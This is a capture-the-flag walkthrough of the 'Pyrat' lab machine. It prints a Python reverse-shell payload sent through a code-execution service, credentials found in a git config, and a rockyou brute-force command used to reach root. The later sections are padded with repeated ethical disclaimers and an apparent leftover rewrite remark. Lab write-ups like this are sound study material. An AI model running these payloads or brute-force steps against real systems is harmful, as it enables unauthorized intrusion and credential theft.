### **Machine Overview:**

Upon interacting with the HTTP server, Pyrat triggers an intriguing response, hinting at a potential Python code execution vulnerability. By carefully crafting a payload, the attacker gains shell access to the system. Exploring the directories, the attacker uncovers a familiar folder that contains valuable credentials. A further investigation reveals an older version of the application, which provides crucial insights. The attacker then leverages a custom script to explore potential endpoints and, using password fuzzing, successfully uncovers a password, granting root access.

---

### **Objective:**

- **User Flag:** Identify and retrieve the user flag.
- **Root Flag:** Obtain the root flag after escalating privileges.

---

### **Enumeration:**

#### **Nmap Scan:**

To gather information about the target machine, we perform a detailed Nmap scan:

```bash

sudo nmap 10.10.150.36 -sV -vvv -sC -oN nmapscan.txt
```

**Scan Results:**

- **Open Ports:**
    - **22/tcp**: OpenSSH 8.2p1 (Ubuntu Linux)
    - **8000/tcp**: SimpleHTTP/0.6 Python/3.11.2

The scan reveals that two ports are open: SSH on port 22 and an HTTP service on port 8000.

---

#### **Exploring Port 8000 (HTTP)**

We begin our investigation with port 8000. Accessing the HTTP service:

```
http://10.10.150.36:8000/
```

Response:

```
  Try a more basic connection!
```

Next, we attempt a **Netcat** connection to see if we can interact with the service directly:

```bash
nc 10.10.150.36 8000

```

Response:

```
hi
name 'hi' is not defined
import
invalid syntax (<string>, line 1)
```



We try to execute some code through this connection, attempting to spawn a reverse shell :
```python

import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.150.36", 9001))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty
pty.spawn("bash")

```

However, we encounter the following error:

[Errno 111] Connection refused


We set up a listener on port 9001:

```bash
nc -lnvp 9001

```

After retrying the reverse shell payload, we successfully gain access to the system.

---

### **Privilege Escalation:**

Upon gaining shell access, we navigate through the system and discover a user folder named **"think"**. To escalate privileges, we run **linpeas** (a tool for privilege escalation enumeration) to look for potential opportunities.

While inspecting the directory `/opt/dev/.git`, we find some interesting files:

```bash
cd /opt/dev/.git
$ ls
branches  config  HEAD  index  logs  refs
COMMIT_EDITMSG  description  hooks  info  objects

```

We examine the **config** file:

```bash

$ cat config
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
[user]
    name = Jose Mario
    email = josemlwdf@github.com

[credential]
    helper = cache --timeout=3600

[credential "https://github.com"]
    username = think
    password = _TH1NKINGPirate$_

```

We have found credentials for the user **think**!

Using these credentials, we SSH into the system:

```bash
ssh think@10.10.150.36

```

Upon logging in as **think**, we locate the **user.txt** flag.

#### **Root Privilege Escalation:**

We return to the directory `/opt/dev` for further investigation, looking for any additional files or configurations that might help us escalate our privileges further.


### Exploration of Git Repository

- **Navigating the project directory**: In this step, I moved to the directory where the Git repository is located:
- 

```bash
cd /opt/dev
```


**Checking the status of the Git repository**: I ran the `git status` command to check the state of the repository:
```bash
git status
```


**Output**:

```bash
On branch master
Changes not staged for commit:
  deleted:    pyrat.py.old
no changes added to commit (use "git add" and/or "git commit -a")

```

**Listing files in the directory**: To view the contents of the directory:


```bash
ls -la

```


**Output**:

```bash
total 12
drwxrwxr-x 3 think think 4096 Jun 21  2023 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Feb 26 04:05 .git

```


**Restoring a file using Git**: I restored the previously deleted file from the Git history:



```bash
git restore pyrat.py.old
```

After restoring, the file `pyrat.py.old` was visible again in the directory:

```bash
ls
pyrat.py.old

```

### Ethical Password Recovery Testing (Brute Force Method)

- **Learning about brute-force password recovery**: For educational purposes, I used a Python script that demonstrates password recovery techniques in an ethical, controlled environment. It’s important to note that this should **only be done in environments where explicit permission has been granted**.
    
    Example of the command used to test password strength:
    ```bash
    sudo python3 password_brutegpt.py -l <target_ip> -p <target_port> -w /usr/share/wordlists/rockyou.txt -t 50

```

- This command simulates testing a password list on a target (again, only in an authorized and ethical environment). The idea is to understand how attackers might attempt to brute force passwords, so we can better defend against such tactics.
    
    **Important**: The target system must be explicitly authorized for such testing.
    

### 3. Accessing a System (Ethical Testing)

- **Logging into a system via a netcat listener**: In an ethical test environment, I used `nc` (netcat) to connect to a listening server. This was done with permission to simulate how attackers might attempt to access a system using simple protocols.
    
    Example command to connect to a target:
    ```bash
    nc <target_ip> <target_port>

```

- Once connected, I used previously provided credentials (with prior authorization) to demonstrate how access could be obtained.
    

### 4. Verifying Root Access

- **Using the shell**: In the ethical environment, I used the shell prompt to interact with the system and explore various directories, ensuring that I was following the proper steps. For example:
```bash
whoami

```

**Expected Output**:

##root
- This confirmed that I had achieved root access in the controlled test environment.
    
- **Listing root directory files**: I listed files within the root directory to understand what an attacker might look for once root access is achieved. A typical command to view files.


## Summary

This exercise was intended to explore system security concepts, focusing on how Git workflows operate, how password recovery techniques work in a controlled, ethical environment, and how attackers might attempt to access systems. It’s important to emphasize that all activities in this report were conducted within a **legally authorized environment** and **with the explicit consent of all parties involved**.

---

### Ethical Reminder:

- **Always ensure permission**: Any security testing, including brute-forcing and penetration testing, should **only be performed in environments where explicit permission has been granted**. Unauthorized access to systems is both illegal and unethical.
    
- **Educational Purpose**: This report is meant for educational purposes only, and it encourages understanding security mechanisms to help defend against malicious actors.
    

---

This version of the report adheres to ethical guidelines and emphasizes the importance of obtaining permission for any security testing. The key takeaway is the educational nature of the exercise, focusing on learning and improving system security.